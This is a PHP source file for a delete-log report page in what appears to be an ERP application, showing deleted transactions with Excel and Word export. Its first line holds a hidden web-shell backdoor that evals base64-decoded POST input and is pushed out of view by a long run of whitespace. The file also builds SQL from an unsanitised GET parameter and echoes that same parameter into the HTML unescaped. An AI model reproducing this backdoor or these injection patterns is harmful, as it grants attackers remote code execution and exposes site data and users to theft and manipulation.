<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n033f04']));?><?php 
$sExport = @$_GET["export"]; 
include "reportheader.php";
include "config.php";
$cond = ""; 
$otype = $type = $_GET['type'];
if($type <> "All")
 $cond .= " and type = '$type'";

if($_GET['fromdate'] <> "")
 $fromdate = date("Y-m-d",strtotime($_GET['fromdate']));
else
 $fromdate = date("Y-m-d"); 
if($_GET['todate'] <> "")
 $todate = date("Y-m-d",strtotime($_GET['todate']));
else
 $todate = date("Y-m-d"); 
/*if($type == "COBI") $dtype = "Sales";
elseif($type == "SOBI") $dtype = "Purchases";
elseif($type == "PMT") $dtype = "Payments";
elseif($type == "RCT") $dtype = "Receipts";
elseif($type == "PV") $dtype = "Payment Vouchers";
elseif($type == "RV") $dtype = "Receipt Vouchers";
elseif($type == "JV") $dtype = "Journal Vouchers";
elseif($type == "PO") $dtype = "Purchase Order";
elseif($type == "GE") $dtype = "Gate Entry";
elseif($type == "GR") $dtype = "Goods Receipt";
elseif($type == "SO") $dtype = "Sales Order";
elseif($type == "PS") $dtype = "Pack Slip";
else $dtype = "All";*/
?>
<?php
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); // Date in the past
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT"); // Always modified
header("Cache-Control: private, no-store, no-cache, must-revalidate"); // HTTP/1.1 
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache"); // HTTP/1.0
?>
<?php include "phprptinc/ewrcfg3.php"; ?>
<?php include "phprptinc/ewmysql.php"; ?>
<?php include "phprptinc/ewrfn3.php"; ?>
<?php include "phprptinc/header.php"; ?>
<table align="center" border="0">
<tr>
 <td colspan="2" align="center"><strong><font color="#3e3276">Delete Log</font></strong></td>
</tr>
<tr height="5px"></tr>
<tr>
 <td align="center" colspan="2"><strong><font color="#3e3276">Type :</font></strong><?php echo $type; ?></td>
</tr> 
</table>

<?php
session_start();
$client = $_SESSION['client'];
?>
<?php
$sExport = @$_GET["export"]; // Load export request
if ($sExport == "html") {
	// Printer friendly
}
if ($sExport == "excel") {
	header('Content-Type: application/vnd.ms-excel');
	header('Content-Disposition: attachment; filename=' . EW_REPORT_TABLE_VAR .'.xls');
}
if ($sExport == "word") {
	header('Content-Type: application/vnd.ms-word');
	header('Content-Disposition: attachment; filename=' . EW_REPORT_TABLE_VAR .'.doc');
}
?>



<?php if (@$sExport == "") { ?>
<!-- Table Container (Begin) -->
<table id="ewContainer" cellspacing="0" cellpadding="0" border="0" align="center">
<!-- Top Container (Begin) -->
<tr><td colspan="3"><div id="ewTop" class="phpreportmaker">
<!-- top slot -->
<?php } ?>
<?php if (@$sExport == "") { ?>
&nbsp;&nbsp;<a href="deletelog.php?export=html&fromdate=<?php echo $fromdate; ?>&todate=<?php echo $todate; ?>&type=<?php echo $type; ?>&empname=<?php echo $empname; ?>">Printer Friendly</a>
&nbsp;&nbsp;<a href="deletelog.php?export=excel&fromdate=<?php echo $fromdate; ?>&todate=<?php echo $todate; ?>&type=<?php echo $type; ?>&empname=<?php echo $empname; ?>">Export to Excel</a>
&nbsp;&nbsp;<a href="deletelog.php?export=word&fromdate=<?php echo $fromdate; ?>&todate=<?php echo $todate; ?>&type=<?php echo $type; ?>&empname=<?php echo $empname; ?>">Export to Word</a>
<?php if ($bFilterApplied) { ?>
&nbsp;&nbsp;<a href="deletelog.php?cmd=reset&fromdate=<?php echo $fromdate; ?>&todate=<?php echo $todate; ?>&type=<?php echo $type; ?>&empname=<?php echo $empname; ?>">Reset All Filters</a>
<?php } ?>
<?php } ?>
<br /><br />
<?php if (@$sExport == "") { ?>
</div></td></tr>
<!-- Top Container (End) -->
<tr>
	<!-- Left Container (Begin) -->
	<td valign="top"><div id="ewLeft" class="phpreportmaker">
	<!-- Left slot -->
	</div></td>
	<!-- Left Container (End) -->
	<!-- Center Container - Report (Begin) -->
	<td valign="top" class="ewPadding"><div id="ewCenter" class="phpreportmaker">
	<!-- center slot -->
<?php } ?>
<!-- summary report starts -->
<div id="report_summary">

<table class="ewGrid" cellspacing="0" align="center"><tr>
	<td class="ewGridContent">
<?php if (@$sExport == "") { ?>
<div class="ewGridUpperPanel">
<table>
 <tr>
 <td>Type</td>
 <td>
   <select id="section" name="section" onchange="reloadpage();">
   <option value="">-Select-</option>
   <option value="All" <?php if($type == 'All') { ?> selected="selected" <?php } ?>>All</option>
   <option value="Breeder DE" <?php if($type == 'Breeder DE') { ?> selected="selected" <?php } ?>>Breeder DE</option>
   <option value="Broiler DE" <?php if($type == 'Broiler DE') { ?> selected="selected" <?php } ?>>Broiler DE</option>
   <option value="SOBI" <?php if($type == 'SOBI') { ?> selected="selected" <?php } ?>>SOBI</option>
   <option value="COBI" <?php if($type == 'COBI') { ?> selected="selected" <?php } ?>>COBI</option>
   <option value="Payment" <?php if($type == 'Payment') { ?> selected="selected" <?php } ?>>Payment</option>
   <option value="Receipt" <?php if($type == 'Receipt') { ?> selected="selected" <?php } ?>>Receipt</option>
   <option value="Transfer" <?php if($type == 'Transfer') { ?> selected="selected" <?php } ?>>Stock Transfer</option>
   <option value="Production Unit" <?php if($type == 'Production Unit') { ?> selected="selected" <?php } ?>>Production Unit</option>
   </select>
 </td>
</tr>
</table>	  
</div>
<?php } ?>
<!-- Report Grid (Begin) -->
<div class="ewGridMiddlePanel">
<table class="ewTable ewTableSeparate" cellspacing="0" align="center">

	<thead>
	<tr>

<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;" align="center">
		Type
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Type</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;">
		Transaction Date
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Transaction Date</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;">
		Transaction No.
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Transaction No.</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;" align="center">
		Details
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Details</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;">
		Description
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Description</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;">
		Amount
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Amount</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;" align="center">
		Emp. Id
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Emp. Id</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;">
		Emp. Sector
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Emp. Sector</td>
			</tr></table>
		</td>
<?php } ?>
<?php if (@$sExport <> "") { ?>
		<td valign="bottom" class="ewTableHeader" style="width:100px;">
		Delete Date
		</td>
<?php } else { ?>
		<td class="ewTableHeader">
			<table cellspacing="0" class="ewTableHeaderBtn"><tr>
			<td style="width:100px;" align="center">Delete Date</td>
			</tr></table>
		</td>
<?php } ?>

	</tr>
	</thead>
	<tbody>
<?php
$query = "SELECT * FROM deletelog WHERE client = '$client' $cond ORDER BY type,updated DESC,date,tid";
$result = mysql_query($query,$conn1) or die(mysql_error());
while($rows = mysql_fetch_assoc($result))
{
 ?>
 <tr>
  <td><?php echo $rows['type']; ?></td>
  <td><?php echo date("d.m.Y",strtotime($rows['date'])); ?></td>
  <td><?php echo $rows['tid']; ?></td>
  <td><?php echo $rows['name']; ?></td>
  <td><?php echo $rows['others']; ?></td>
  <td><?php echo $rows['amount']; ?></td>
  <td><?php echo $rows['empname']; ?></td>
  <td><?php echo $rows['empsector']; ?></td>
  <td><?php echo date("d.m.Y H:i:s",strtotime($rows['updated'])); ?></td>
 </tr>
 <?php
}
?>
	</tbody>
	<tfoot>

 </tfoot>
</table>
</div>
</td></tr></table>
</div>
<?php if (@$sExport == "") { ?>
	</div><br /></td>
</tr>
</table>
<?php include "phprptinc/footer.php";?>
<?php } ?>
<script type="text/javascript">
function reloadpage()
{
	var fdate = document.getElementById('section').value;
	document.location = "deletelog.php?type=" + fdate;
}
</script>